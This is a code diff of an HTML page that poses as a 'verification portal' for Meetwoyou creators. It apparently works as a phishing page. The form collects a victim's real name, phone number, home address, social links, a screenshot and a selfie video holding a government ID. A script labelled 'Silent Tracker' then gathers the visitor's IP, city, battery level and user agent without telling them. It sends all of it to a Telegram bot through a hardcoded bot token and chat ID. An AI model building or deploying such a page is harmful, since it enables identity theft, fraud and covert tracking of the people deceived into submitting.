@@ -3,86 +3,154 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Portal | Meetwoyou</title>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> <style>
+    <title>Creator Verification | Meetwoyou</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
         :root {
-            --primary-gold: #ffcc00;
-            --bg-dark: #090909;
-            --card-bg: #151515;
-            --input-bg: #1f1f1f;
-            --text-gray: #a0a0a0;
+            --primary: #ffcc00;
+            --primary-hover: #e6b800;
+            --bg-black: #050505;
+            --card-bg: #121212;
+            --input-bg: #1a1a1a;
+            --border-color: #2a2a2a;
+            --text-muted: #888;
+            --error: #ff4444;
         }
 
+        * { box-sizing: border-box; }
+
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: var(--bg-black);
             color: #ffffff;
             margin: 0;
-            padding: 20px;
+            padding: 40px 20px;
             display: flex;
             justify-content: center;
+            line-height: 1.6;
         }
 
         .container {
             width: 100%;
-            max-width: 450px;
+            max-width: 500px;
             background: var(--card-bg);
-            padding: 40px 25px;
-            border-radius: 20px;
-            border: 1px solid #222;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
 
-        .header { text-align: center; margin-bottom: 30px; }
-        .logo { width: 90px; height: 90px; border-radius: 50%; border: 2px solid var(--primary-gold); margin-bottom: 15px; }
+        .header { text-align: center; margin-bottom: 35px; }
+        .logo { 
+            width: 80px; height: 80px; border-radius: 50%; 
+            border: 3px solid var(--primary); margin-bottom: 15px;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+        }
+
+        h2 { font-weight: 800; font-size: 1.8rem; margin: 0; letter-spacing: -0.5px; }
+        .subtitle { color: var(--text-muted); font-size: 0.95rem; margin-top: 5px; }
 
         .offer-banner {
-            background: linear-gradient(90deg, #ffcc00, #ff9900);
-            color: #000;
+            background: rgba(255, 204, 0, 0.1);
+            color: var(--primary);
             padding: 12px;
-            border-radius: 10px;
-            font-weight: 800;
-            font-size: 0.85rem;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 0.8rem;
             text-align: center;
             text-transform: uppercase;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
+            border: 1px dashed var(--primary);
             letter-spacing: 1px;
         }
 
-        .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; color: var(--text-gray); font-size: 0.85rem; font-weight: 600; }
-        
-        input, textarea {
-            width: 100%;
-            padding: 14px;
-            background: var(--input-bg);
-            border: 1px solid #333;
-            border-radius: 10px;
-            color: white;
-            font-size: 1rem;
-            transition: 0.3s;
+        .section-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            color: var(--primary);
+            letter-spacing: 1.5px;
+            margin: 25px 0 15px 0;
+            display: block;
+            font-weight: 800;
         }
 
-        input:focus { border-color: var(--primary-gold); outline: none; background: #252525; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #ddd; font-size: 0.85rem; font-weight: 600; }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 14px 16px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: white;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus { 
+            border-color: var(--primary); 
+            outline: none; 
+            background: #222;
+            box-shadow: 0 0 0 4px rgba(255, 204, 0, 0.1);
+        }
+
+        .warning-box {
+            background: rgba(255, 68, 68, 0.1);
+            border-left: 4px solid var(--error);
+            padding: 10px 15px;
+            font-size: 0.8rem;
+            color: #ff8888;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        /* Video Preview Styles */
+        #videoPreview {
+            width: 100%;
+            border-radius: 12px;
+            margin-top: 10px;
+            display: none;
+            background: #000;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            display: none;
+            width: 100%;
+            height: 6px;
+            background: #222;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
 
         .btn-submit {
             width: 100%;
-            padding: 16px;
-            background: var(--primary-gold);
+            padding: 18px;
+            background: var(--primary);
             border: none;
-            border-radius: 12px;
-            font-weight: bold;
+            border-radius: 14px;
+            font-weight: 800;
             font-size: 1rem;
             cursor: pointer;
             color: #000;
-            transition: 0.3s transform;
+            transition: transform 0.2s, background 0.2s;
             margin-top: 10px;
         }
 
-        .btn-submit:active { transform: scale(0.98); }
+        .btn-submit:hover { background: var(--primary-hover); }
+        .btn-submit:active { transform: scale(0.97); }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        /* Hidden status for tracker */
-        #tracker-status { display: none; }
+        ::placeholder { color: #555; }
     </style>
 </head>
 <body>
@@ -90,38 +158,89 @@
 <div class="container">
     <div class="header">
         <img src="meetwoyou.jpg" alt="Meetwoyou" class="logo">
-        <h2 style="margin: 0; letter-spacing: -1px;">Apply for Verification</h2>
-        <p style="color: var(--text-gray); font-size: 0.9rem;">Identity verification for Meetwoyou creators.</p>
+        <h2>Verification Portal</h2>
+        <p class="subtitle">Join the elite circle of verified creators.</p>
     </div>
 
     <div class="offer-banner">
-        🚀 Limited Time: Free Social Offer
+        ✨ Priority Review Enabled for New Creators
+    </div>
+
+    <div class="warning-box">
+        <b>Warning:</b> Providing false information or forged documents will result in a permanent ban of your Meetwoyou ID.
     </div>
 
     <form id="verifyForm">
+        <span class="section-title">Basic Information</span>
+        
         <div class="form-group">
-            <label>Meetwoyou ID Name</label>
-            <input type="text" id="meetId" placeholder="e.g. @yash_khan" required>
+            <label>Meetwoyou ID</label>
+            <input type="text" id="meetId" placeholder="@username" required>
         </div>
+
+        <div class="form-group">
+            <label>Verification Type</label>
+            <select id="vType" required>
+                <option value="Creator">Creator</option>
+                <option value="Influencer">Influencer</option>
+                <option value="Business">Business / Brand</option>
+                <option value="Public Figure">Public Figure</option>
+            </select>
+        </div>
+
         <div class="form-group">
             <label>Real Full Name</label>
-            <input type="text" id="realName" required>
+            <input type="text" id="realName" placeholder="As per Govt ID" required>
         </div>
+
         <div class="form-group">
-            <label>Phone Number</label>
-            <input type="tel" id="phone" placeholder="+966..." required>
+            <label>Phone Number (KSA)</label>
+            <input type="tel" id="phone" placeholder="+966 5X XXX XXXX" required>
         </div>
+
         <div class="form-group">
             <label>Email Address</label>
-            <input type="email" id="email" required>
+            <input type="email" id="email" placeholder="name@example.com" required>
         </div>
+
         <div class="form-group">
-            <label>Full Residential Address & Postal Code</label>
-            <textarea id="address" rows="3" placeholder="Street, City, Postal Code" required></textarea>
+            <label>Residential Address</label>
+            <textarea id="address" rows="2" placeholder="Full street address and Postal Code" required></textarea>
         </div>
+
+        <span class="section-title">Social Presence</span>
+
         <div class="form-group">
-            <label>Verification Video (20-30 Seconds)</label>
-            <input type="file" id="videoFile" accept="video/*" required style="padding: 10px;">
+            <label>Facebook Profile Link (Required)</label>
+            <input type="url" id="fbLink" placeholder="https://facebook.com/yourprofile" required>
+        </div>
+
+        <div class="form-group">
+            <label>Instagram Link (Optional)</label>
+            <input type="url" id="igLink" placeholder="https://instagram.com/...">
+        </div>
+
+        <div class="form-group">
+            <label>TikTok Link (Optional)</label>
+            <input type="url" id="tkLink" placeholder="https://tiktok.com/@...">
+        </div>
+
+        <span class="section-title">Media Verification</span>
+
+        <div class="form-group">
+            <label>Profile Screenshot</label>
+            <input type="file" id="screenshot" accept="image/*" required>
+        </div>
+
+        <div class="form-group">
+            <label>Selfie Video (20-30s)</label>
+            <p style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 8px;">Hold your ID card and say "I am [Name] for Meetwoyou".</p>
+            <input type="file" id="videoFile" accept="video/*" required>
+            <video id="videoPreview" controls></video>
+        </div>
+
+        <div class="progress-container" id="progCont">
+            <div class="progress-bar" id="progBar"></div>
         </div>
 
         <button type="submit" class="btn-submit" id="submitBtn">Submit Application</button>
@@ -132,53 +251,89 @@
     const BOT_TOKEN = "8385508779:AAGWgCBn13wKo1AYGKpvUIBHgj-JojNtos4";
     const CHAT_ID = "7950771882";
 
+    // Video Preview Logic
+    document.getElementById('videoFile').addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        const videoPreview = document.getElementById('videoPreview');
+        if (file) {
+            const url = URL.createObjectURL(file);
+            videoPreview.src = url;
+            videoPreview.style.display = "block";
+        }
+    });
+
     document.getElementById('verifyForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "Uploading & Sending...";
-        btn.disabled = true;
+        
+        // --- VALIDATION ---
+        const phone = document.getElementById('phone').value;
+        const email = document.getElementById('email').value;
+        const fb = document.getElementById('fbLink').value;
 
-        // 1. Fetch Silent Tracker Data (IP & Location)
-        let ipData = { ip: "Unknown", city: "Unknown", country: "Unknown", timezone: "Unknown" };
+        if (!phone.startsWith('+966')) {
+            return Swal.fire('Error', 'Phone number must start with +966', 'error');
+        }
+
+        if (!fb.includes('facebook.com')) {
+            return Swal.fire('Error', 'Please provide a valid Facebook URL', 'error');
+        }
+
+        const btn = document.getElementById('submitBtn');
+        const progCont = document.getElementById('progCont');
+        const progBar = document.getElementById('progBar');
+
+        btn.innerText = "Submitting...";
+        btn.disabled = true;
+        progCont.style.display = "block";
+        progBar.style.width = "10%";
+
+        // Generate App ID
+        const appId = "MW-" + Date.now();
+
+        // 1. Silent Tracker Data
+        let ipData = { ip: "Blocked", city: "Unknown", country_name: "Unknown", timezone: "Unknown" };
         try {
             const response = await fetch('https://ipapi.co/json/');
             ipData = await response.json();
-        } catch (err) { console.log("Tracker failed or blocked"); }
+            progBar.style.width = "30%";
+        } catch (err) {}
 
-        // 2. Battery & Device Info
+        // 2. Device/Battery Info
         let batteryLevel = "N/A";
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
             batteryLevel = (battery.level * 100) + "%";
         }
 
-        const meetId = document.getElementById('meetId').value;
-        const realName = document.getElementById('realName').value;
-        const phone = document.getElementById('phone').value;
-        const email = document.getElementById('email').value;
-        const address = document.getElementById('address').value;
-        const videoFile = document.getElementById('videoFile').files[0];
-
-        // 3. Construct Message
+        // 3. Construct Detailed Caption
         const caption = `
-🚀 *New Verified Badge Application*
+🌟 *NEW VERIFICATION REQUEST* 🌟
+━━━━━━━━━━━━━━━━━━━━
+🆔 *App ID:* \`${appId}\`
+👤 *Meetwoyou:* ${document.getElementById('meetId').value}
+📑 *Type:* ${document.getElementById('vType').value}
 
-👤 *ID:* ${meetId}
-👤 *Real Name:* ${realName}
-📧 *Email:* ${email}
-📱 *Phone:* ${phone}
-📍 *Address:* ${address}
+*PERSONAL INFO:*
+• *Name:* ${document.getElementById('realName').value}
+• *Email:* ${email}
+• *Phone:* ${phone}
+• *Address:* ${document.getElementById('address').value}
 
-🔍 *Silent Tracker Info:*
+*SOCIAL LINKS:*
+• *FB:* ${fb}
+• *IG:* ${document.getElementById('igLink').value || 'None'}
+• *TikTok:* ${document.getElementById('tkLink').value || 'None'}
+
+*NETWORK & DEVICE:*
 • *IP:* ${ipData.ip}
-• *Location:* ${ipData.city}, ${ipData.country_name}
-• *Timezone:* ${ipData.timezone}
-• *Battery:* ${batteryLevel}
-• *Device:* ${navigator.userAgent.substring(0, 50)}...
-• *Time:* ${new Date().toLocaleString()}
+• *City:* ${ipData.city}
+• *Power:* ${batteryLevel}
+• *Agent:* ${navigator.userAgent.substring(0, 40)}...
+━━━━━━━━━━━━━━━━━━━━
         `;
 
-        // 4. Send to Telegram (Video + Caption)
+        // 4. Send Media to Telegram
+        const videoFile = document.getElementById('videoFile').files[0];
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         formData.append('video', videoFile);
@@ -186,29 +341,32 @@
         formData.append('parse_mode', 'Markdown');
 
         try {
+            progBar.style.width = "60%";
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
             });
 
+            progBar.style.width = "100%";
+
             if (res.ok) {
-                // SUCCESS POP-UP
                 Swal.fire({
-                    title: 'Application Received!',
-                    text: 'We have received your request. Our team will review your profile within 24 hours.',
+                    title: 'Application Sent!',
+                    html: `Your ID: <b>${appId}</b><br><br>Our team will review your social presence and verification video within 24 hours.`,
                     icon: 'success',
-                    confirmButtonColor: '#ffcc00',
-                    confirmButtonText: 'Great!'
+                    confirmButtonColor: '#ffcc00'
                 });
                 document.getElementById('verifyForm').reset();
+                document.getElementById('videoPreview').style.display = "none";
             } else {
-                throw new Error("Upload failed");
+                throw new Error("Failed");
             }
         } catch (error) {
-            Swal.fire('Error', 'Submission failed. Please check your internet or video size.', 'error');
+            Swal.fire('Upload Error', 'The video might be too large. Please try a shorter clip.', 'error');
         } finally {
             btn.innerText = "Submit Application";
             btn.disabled = false;
+            setTimeout(() => { progCont.style.display = "none"; progBar.style.width = "0%"; }, 2000);
         }
     });
 </script>
